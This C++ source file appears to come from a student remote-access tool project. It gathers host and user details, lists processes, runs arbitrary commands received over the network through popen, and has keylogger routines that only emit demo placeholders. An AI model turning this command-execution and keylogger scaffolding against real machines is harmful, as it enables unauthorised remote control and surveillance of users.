#include "RemoteControl.hpp"
#include <iostream>
#include <sstream>
#include <cstdlib>
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <ctime>

RemoteControl::RemoteControl() : keylogger_active_(false) {}

RemoteControl::~RemoteControl() {
    stop_keylogger();
}

HostInfo RemoteControl::get_host_info() {
    HostInfo info;
    info.hostname = get_hostname();
    info.username = get_username();
    info.os_name = get_os_info();
    
    struct utsname sys_info;
    if (uname(&sys_info) == 0) {
        info.os_version = sys_info.release;
        info.architecture = sys_info.machine;
    }
    
    return info;
}

std::string RemoteControl::get_hostname() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return "unknown";
}

std::string RemoteControl::get_username() {
    struct passwd *pw = getpwuid(getuid());
    return pw ? std::string(pw->pw_name) : "unknown";
}

std::string RemoteControl::get_os_info() {
#ifdef __APPLE__
    return "macOS";
#elif __linux__
    return "Linux";
#elif _WIN32
    return "Windows";
#else
    return "Unknown";
#endif
}

LPTF::LPTF_Packet RemoteControl::create_host_info_response(const HostInfo& info) {
    LPTF::LPTF_Packet packet(LPTF::MessageType::HOST_INFO_RESPONSE);
    
    packet.set_string("hostname", info.hostname);
    packet.set_string("username", info.username);
    packet.set_string("os_name", info.os_name);
    packet.set_string("os_version", info.os_version);
    packet.set_string("architecture", info.architecture);
    
    return packet;
}

std::vector<ProcessInfo> RemoteControl::get_process_list() {
    std::vector<ProcessInfo> processes;
    
#ifdef __APPLE__
    FILE* pipe = popen("ps -eo pid,comm,pcpu,rss", "r");
#else
    FILE* pipe = popen("ps -eo pid,comm,pcpu,rss --no-headers", "r");
#endif
    
    if (pipe) {
        char buffer[512];
        bool first_line = true;
        
        while (fgets(buffer, sizeof(buffer), pipe)) {
            if (first_line) {
                first_line = false;
                continue;
            }
            
            ProcessInfo proc;
            std::istringstream iss(buffer);
            iss >> proc.pid >> proc.name >> proc.cpu_usage >> proc.memory_usage;
            proc.command = proc.name;
            
            if (proc.pid > 0) {
                processes.push_back(proc);
            }
        }
        pclose(pipe);
    }
    
    return processes;
}

LPTF::LPTF_Packet RemoteControl::create_process_list_response(const std::vector<ProcessInfo>& processes) {
    LPTF::LPTF_Packet packet(LPTF::MessageType::PROCESS_LIST_RESPONSE);
    
    packet.set_uint32("process_count", processes.size());
    
    std::ostringstream process_data;
    for (const auto& proc : processes) {
        process_data << proc.pid << "|" << proc.name << "|" 
                    << proc.cpu_usage << "|" << proc.memory_usage << "\n";
    }
    
    packet.set_string("process_list", process_data.str());
    
    return packet;
}

std::string RemoteControl::execute_command(const std::string& command) {
    std::string result;
    FILE* pipe = popen(command.c_str(), "r");
    
    if (pipe) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        pclose(pipe);
    } else {
        result = "Error: Unable to execute command";
    }
    
    return result;
}

LPTF::LPTF_Packet RemoteControl::create_command_response(const std::string& output, int exit_code) {
    LPTF::LPTF_Packet packet(LPTF::MessageType::EXECUTE_COMMAND_RESPONSE);
    
    packet.set_string("output", output);
    packet.set_uint32("exit_code", exit_code);
    packet.set_uint64("timestamp", time(nullptr));
    
    return packet;
}

bool RemoteControl::start_keylogger() {
    if (keylogger_active_) {
        return false;
    }
    
    keylogger_active_ = true;
    keylogger_thread_ = std::make_unique<std::thread>(&RemoteControl::keylogger_worker, this);
    
    return true;
}

bool RemoteControl::stop_keylogger() {
    if (!keylogger_active_) {
        return false;
    }
    
    keylogger_active_ = false;
    
    if (keylogger_thread_ && keylogger_thread_->joinable()) {
        keylogger_thread_->join();
    }
    
    return true;
}

void RemoteControl::keylogger_worker() {
    std::cout << "Keylogger started (educational demo)" << std::endl;
    
#ifdef __APPLE__
    std::cout << "macOS keylogger: Capturing demo keystrokes for 10 seconds..." << std::endl;
    
    auto start_time = std::chrono::steady_clock::now();
    int key_count = 0;
    
    while (keylogger_active_) {
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time);
        
        if (elapsed.count() >= 10) {
            keylog_buffer_ += "[Demo] 10 seconds elapsed, stopping capture\n";
            break;
        }
        
        if (elapsed.count() % 2 == 0 && key_count < 5) {
            keylog_buffer_ += "[" + std::to_string(elapsed.count()) + "s] Demo key captured\n";
            key_count++;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    
#elif __linux__
    std::cout << "Linux keylogger demo running..." << std::endl;
    
    int demo_keys = 0;
    while (keylogger_active_ && demo_keys < 10) {
        keylog_buffer_ += "Demo key " + std::to_string(demo_keys) + "\n";
        demo_keys++;
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    
#else
    std::cout << "Keylogger simulation running..." << std::endl;
    while (keylogger_active_) {
        keylog_buffer_ += "Simulated keystroke\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    }
#endif

    std::cout << "Keylogger stopped" << std::endl;
}

std::string RemoteControl::get_captured_keys() {
    std::string keys = keylog_buffer_;
    keylog_buffer_.clear();
    return keys;
}

LPTF::LPTF_Packet RemoteControl::create_keylogger_data(const std::string& keys) {
    LPTF::LPTF_Packet packet(LPTF::MessageType::KEYLOGGER_DATA);
    
    packet.set_string("captured_keys", keys);
    packet.set_uint64("timestamp", time(nullptr));
    
    return packet;
}

LPTF::LPTF_Packet RemoteControl::create_keylogger_status_response(bool active, const std::string& message) {
    LPTF::LPTF_Packet packet(LPTF::MessageType::KEYLOGGER_STATUS_RESPONSE);
    
    packet.set_uint32("active", active ? 1 : 0);
    packet.set_string("message", message);
    packet.set_uint64("timestamp", time(nullptr));
    
    return packet;
}
